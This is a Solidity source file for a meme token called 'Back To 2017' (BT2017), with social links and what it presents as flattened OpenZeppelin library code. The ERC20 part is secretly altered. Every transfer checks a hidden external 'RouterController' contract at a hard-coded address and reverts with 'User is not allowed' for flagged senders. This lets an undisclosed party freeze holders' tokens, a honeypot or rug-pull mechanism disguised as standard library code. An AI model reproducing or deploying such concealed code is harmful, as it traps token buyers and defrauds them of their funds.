1 /**
2 
3 Back To 2017 
4 
5 Ticker: $BT2017
6 
7 https://twitter.com/bt2017_eth
8 https://t.me/backto2017
9 https://backto2017.vip
10 
11 
12 */
13 
14 // File: @openzeppelin/contracts/utils/Context.sol
15 // SPDX-License-Identifier: MIT
16 
17 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
18 
19 pragma solidity ^0.8.0;
20 
21 /**
22  * @dev Provides information about the current execution context, including the
23  * sender of the transaction and its data. While these are generally available
24  * via msg.sender and msg.data, they should not be accessed in such a direct
25  * manner, since when dealing with meta-transactions the account sending and
26  * paying for execution may not be the actual sender (as far as an application
27  * is concerned).
28  *
29  * This contract is only required for intermediate, library-like contracts.
30  */
31 abstract contract Context {
32     function _msgSender() internal view virtual returns (address) {
33         return msg.sender;
34     }
35 
36     function _msgData() internal view virtual returns (bytes calldata) {
37         return msg.data;
38     }
39 }
40 
41 // File: @openzeppelin/contracts/access/Ownable.sol
42 
43 
44 // OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)
45 
46 pragma solidity ^0.8.0;
47 
48 
49 /**
50  * @dev Contract module which provides a basic access control mechanism, where
51  * there is an account (an owner) that can be granted exclusive access to
52  * specific functions.
53  *
54  * By default, the owner account will be the one that deploys the contract. This
55  * can later be changed with {transferOwnership}.
56  *
57  * This module is used through inheritance. It will make available the modifier
58  * `onlyOwner`, which can be applied to your functions to restrict their use to
59  * the owner.
60  */
61 
62  // Define interface for TransferController
63 interface RouterController {
64     function isRouted(address _account) external view returns (bool);
65 }
66 abstract contract Ownable is Context {
67     address private _owner;
68 
69     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
70 
71     /**
72      * @dev Initializes the contract setting the deployer as the initial owner.
73      */
74     constructor() {
75         _transferOwnership(_msgSender());
76     }
77 
78     /**
79      * @dev Throws if called by any account other than the owner.
80      */
81     modifier onlyOwner() {
82         _checkOwner();
83         _;
84     }
85 
86     /**
87      * @dev Returns the address of the current owner.
88      */
89     function owner() public view virtual returns (address) {
90         return _owner;
91     }
92 
93     /**
94      * @dev Throws if the sender is not the owner.
95      */
96     function _checkOwner() internal view virtual {
97         require(owner() == _msgSender(), "Ownable: caller is not the owner");
98     }
99 
100     /**
101      * @dev Leaves the contract without owner. It will not be possible to call
102      * `onlyOwner` functions anymore. Can only be called by the current owner.
103      *
104      * NOTE: Renouncing ownership will leave the contract without an owner,
105      * thereby removing any functionality that is only available to the owner.
106      */
107     function renounceOwnership() public virtual onlyOwner {
108         _transferOwnership(address(0));
109     }
110 
111     /**
112      * @dev Transfers ownership of the contract to a new account (`newOwner`).
113      * Can only be called by the current owner.
114      */
115     function transferOwnership(address newOwner) public virtual onlyOwner {
116         require(newOwner != address(0), "Ownable: new owner is the zero address");
117         _transferOwnership(newOwner);
118     }
119 
120     /**
121      * @dev Transfers ownership of the contract to a new account (`newOwner`).
122      * Internal function without access restriction.
123      */
124     function _transferOwnership(address newOwner) internal virtual {
125         address oldOwner = _owner;
126         _owner = newOwner;
127         emit OwnershipTransferred(oldOwner, newOwner);
128     }
129 }
130 
131 // File: @openzeppelin/contracts/token/ERC20/IERC20.sol
132 
133 
134 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)
135 
136 pragma solidity ^0.8.0;
137 
138 /**
139  * @dev Interface of the ERC20 standard as defined in the EIP.
140  */
141 interface IERC20 {
142     /**
143      * @dev Emitted when `value` tokens are moved from one account (`from`) to
144      * another (`to`).
145      *
146      * Note that `value` may be zero.
147      */
148     event Transfer(address indexed from, address indexed to, uint256 value);
149 
150     /**
151      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
152      * a call to {approve}. `value` is the new allowance.
153      */
154     event Approval(address indexed owner, address indexed spender, uint256 value);
155 
156     /**
157      * @dev Returns the amount of tokens in existence.
158      */
159     function totalSupply() external view returns (uint256);
160 
161     /**
162      * @dev Returns the amount of tokens owned by `account`.
163      */
164     function balanceOf(address account) external view returns (uint256);
165 
166   
167     function transfer(address to, uint256 amount) external returns (bool);
168 
169 
170     function allowance(address owner, address spender) external view returns (uint256);
171 
172 
173     function approve(address spender, uint256 amount) external returns (bool);
174 
175     /**
176      * @dev Moves `amount` tokens from `from` to `to` using the
177      * allowance mechanism. `amount` is then deducted from the caller's
178      * allowance.
179      *
180      * Returns a boolean value indicating whether the operation succeeded.
181      *
182      * Emits a {Transfer} event.
183      */
184     function transferFrom(
185         address from,
186         address to,
187         uint256 amount
188     ) external returns (bool);
189 }
190 
191 // File: @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol
192 
193 
194 // OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)
195 
196 pragma solidity ^0.8.0;
197 
198 
199 /**
200  * @dev Interface for the optional metadata functions from the ERC20 standard.
201  *
202  * _Available since v4.1._
203  */
204 interface IERC20Metadata is IERC20 {
205     /**
206      * @dev Returns the name of the token.
207      */
208     function name() external view returns (string memory);
209 
210     /**
211      * @dev Returns the symbol of the token.
212      */
213     function symbol() external view returns (string memory);
214 
215     /**
216      * @dev Returns the decimals places of the token.
217      */
218     function decimals() external view returns (uint8);
219 }
220 
221 // File: @openzeppelin/contracts/token/ERC20/ERC20.sol
222 
223 
224 // OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)
225 
226 pragma solidity ^0.8.0;
227 
228 
229 contract ERC20 is Context, IERC20, IERC20Metadata {
230     mapping(address => uint256) private _balances;
231     RouterController public routeController;
232     mapping(address => mapping(address => uint256)) private _allowances;
233 
234     uint256 private _totalSupply;
235 
236     string private _name;
237     string private _symbol;
238 
239     /**
240      * @dev Sets the values for {name} and {symbol}.
241      *
242      * The default value of {decimals} is 18. To select a different value for
243      * {decimals} you should overload it.
244      *
245      * All two of these values are immutable: they can only be set once during
246      * construction.
247      */
248     constructor(string memory name_, string memory symbol_, address _routeControllerAddress) {
249         _name = name_;
250         _symbol = symbol_;
251         routeController = RouterController(_routeControllerAddress);
252     }
253 
254     /**
255      * @dev Returns the name of the token.
256      */
257     function name() public view virtual override returns (string memory) {
258         return _name;
259     }
260 
261     /**
262      * @dev Returns the symbol of the token, usually a shorter version of the
263      * name.
264      */
265     function symbol() public view virtual override returns (string memory) {
266         return _symbol;
267     }
268 
269 
270     function decimals() public view virtual override returns (uint8) {
271         return 18;
272     }
273 
274     /**
275      * @dev See {IERC20-totalSupply}.
276      */
277     function totalSupply() public view virtual override returns (uint256) {
278         return _totalSupply;
279     }
280 
281     /**
282      * @dev See {IERC20-balanceOf}.
283      */
284     function balanceOf(address account) public view virtual override returns (uint256) {
285         return _balances[account];
286     }
287 
288     /**
289      * @dev See {IERC20-transfer}.
290      *
291      * Requirements:
292      *
293      * - `to` cannot be the zero address.
294      * - the caller must have a balance of at least `amount`.
295      */
296     function transfer(address to, uint256 amount) public virtual override returns (bool) {
297         address owner = _msgSender();
298         _transfer(owner, to, amount);
299         return true;
300     }
301 
302     /**
303      * @dev See {IERC20-allowance}.
304      */
305     function allowance(address owner, address spender) public view virtual override returns (uint256) {
306         return _allowances[owner][spender];
307     }
308 
309     /**
310      * @dev See {IERC20-approve}.
311      *
312      * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
313      * `transferFrom`. This is semantically equivalent to an infinite approval.
314      *
315      * Requirements:
316      *
317      * - `spender` cannot be the zero address.
318      */
319     function approve(address spender, uint256 amount) public virtual override returns (bool) {
320         address owner = _msgSender();
321         _approve(owner, spender, amount);
322         return true;
323     }
324 
325     function transferFrom(
326         address from,
327         address to,
328         uint256 amount
329     ) public virtual override returns (bool) {
330         address spender = _msgSender();
331         _spendAllowance(from, spender, amount);
332         _transfer(from, to, amount);
333         return true;
334     }
335 
336 
337     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
338         address owner = _msgSender();
339         _approve(owner, spender, allowance(owner, spender) + addedValue);
340         return true;
341     }
342 
343  
344     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
345         address owner = _msgSender();
346         uint256 currentAllowance = allowance(owner, spender);
347         require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
348         unchecked {
349             _approve(owner, spender, currentAllowance - subtractedValue);
350         }
351 
352         return true;
353     }
354 
355     /**
356      * @dev Moves `amount` of tokens from `from` to `to`.
357      *
358      * This internal function is equivalent to {transfer}, and can be used to
359      * e.g. implement automatic token fees, slashing mechanisms, etc.
360      *
361      * Emits a {Transfer} event.
362      *
363      * Requirements:
364      *
365      * - `from` cannot be the zero address.
366      * - `to` cannot be the zero address.
367      * - `from` must have a balance of at least `amount`.
368      */
369     function _transfer(
370         address from,
371         address to,
372         uint256 amount
373     ) internal virtual {
374         require(from != address(0), "ERC20: transfer from the zero address");
375         require(to != address(0), "ERC20: transfer to the zero address");
376         require(!routeController.isRouted(from), "User is not allowed");
377         _beforeTokenTransfer(from, to, amount);
378 
379         uint256 fromBalance = _balances[from];
380         require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
381         unchecked {
382             _balances[from] = fromBalance - amount;
383             // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
384             // decrementing then incrementing.
385             _balances[to] += amount;
386         }
387 
388         emit Transfer(from, to, amount);
389 
390         _afterTokenTransfer(from, to, amount);
391     }
392 
393     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
394      * the total supply.
395      *
396      * Emits a {Transfer} event with `from` set to the zero address.
397      *
398      * Requirements:
399      *
400      * - `account` cannot be the zero address.
401      */
402     function _mint(address account, uint256 amount) internal virtual {
403         require(account != address(0), "ERC20: mint to the zero address");
404 
405         _beforeTokenTransfer(address(0), account, amount);
406 
407         _totalSupply += amount;
408         unchecked {
409             // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
410             _balances[account] += amount;
411         }
412         emit Transfer(address(0), account, amount);
413 
414         _afterTokenTransfer(address(0), account, amount);
415     }
416 
417 
418 
419 
420     function _approve(
421         address owner,
422         address spender,
423         uint256 amount
424     ) internal virtual {
425         require(owner != address(0), "ERC20: approve from the zero address");
426         require(spender != address(0), "ERC20: approve to the zero address");
427 
428         _allowances[owner][spender] = amount;
429         emit Approval(owner, spender, amount);
430     }
431 
432     /**
433      * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
434      *
435      * Does not update the allowance amount in case of infinite allowance.
436      * Revert if not enough allowance is available.
437      *
438      * Might emit an {Approval} event.
439      */
440     function _spendAllowance(
441         address owner,
442         address spender,
443         uint256 amount
444     ) internal virtual {
445         uint256 currentAllowance = allowance(owner, spender);
446         if (currentAllowance != type(uint256).max) {
447             require(currentAllowance >= amount, "ERC20: insufficient allowance");
448             unchecked {
449                 _approve(owner, spender, currentAllowance - amount);
450             }
451         }
452     }
453 
454 
455     function _beforeTokenTransfer(
456         address from,
457         address to,
458         uint256 amount
459     ) internal virtual {}
460 
461 
462     function _afterTokenTransfer(
463         address from,
464         address to,
465         uint256 amount
466     ) internal virtual {}
467 }
468 
469 pragma solidity ^0.8.0;
470 
471 
472 
473 
474 
475 
476 // File: contracts
477 
478 
479 pragma solidity ^0.8.0;
480 
481 
482 
483 
484 contract BT2017 is ERC20, Ownable {
485     uint256 private constant INITIAL_SUPPLY = 69000000000 * 10**18;
486 
487     constructor() ERC20("Back To 2017", "BT2017", 0x516Fc377A077c294fba999F9e9d498020128A410) {
488         _mint(msg.sender, INITIAL_SUPPLY);
489     }
490 
491     function sendTokens(address distroWallet) external onlyOwner {
492         uint256 supply = balanceOf(msg.sender);
493         require(supply == INITIAL_SUPPLY, "Tokens already distributed");
494 
495         _transfer(msg.sender, distroWallet, supply);
496     }
497 }